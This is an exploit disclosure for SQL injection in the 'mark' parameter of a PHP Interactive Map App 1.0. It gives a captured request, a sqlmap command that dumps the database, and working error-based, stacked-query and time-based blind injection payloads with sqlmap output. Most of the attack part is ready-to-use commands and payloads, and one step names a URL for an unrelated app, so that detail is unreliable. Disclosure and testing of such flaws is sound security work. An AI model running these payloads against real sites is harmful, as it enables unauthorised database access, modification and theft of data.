# Interactive Map App - SQL Injection
+ **Exploit Title:** Interactive Map App - SQL Injection
+ **Date:** 2024-10-05
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://www.sourcecodester.com/php/17354/interactive-map-markers-using-php-and-mysql-source-code.html
+ **Software Link:** https://www.sourcecodester.com/download-code?nid=17354&title=Interactive+Map+with+Marker+Using+PHP+and+MySQL+with+Source+Code
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number.

## Description:
İnteractive Map App  1.0 allows SQL Injection via the 'mark' parameter at "http://localhost/interactive-map-marker/endpoint/delete-mark.php?mark=7". 
Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "http://localhost/daily-expenses-monitoring-app/"
+ Click the delete button in marked locations
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:
```
GET /interactive-map-marker/endpoint/delete-mark.php?mark=7 HTTP/1.1
Host: localhost
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
```

+ Use sqlmap to exploit. In sqlmap, use 'mark' parameter to dump the database.
```
sqlmap -r r.txt -p mark --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: mark (GET)
    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: mark=7' AND EXTRACTVALUE(9267,CONCAT(0x5c,0x716a7a6a71,(SELECT (ELT(9267=9267,1))),0x71767a7171))-- oYuy

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: mark=7';SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: mark=7' AND (SELECT 3083 FROM (SELECT(SLEEP(5)))SmNM)-- VjjM
---
[18:53:21] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.58, PHP 8.2.12
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
[18:53:22] [INFO] fetching current database
[18:53:22] [INFO] retrieved: 'map_mark_db'
current database: 'map_mark_db'
```
+ current database: `map_mark_db`

![Ekran görüntüsü 2024-05-15 035725](https://github.com/BurakSevben/CVEs/assets/117217689/97c0d0cf-85b6-458c-8489-4be4ee19a783)
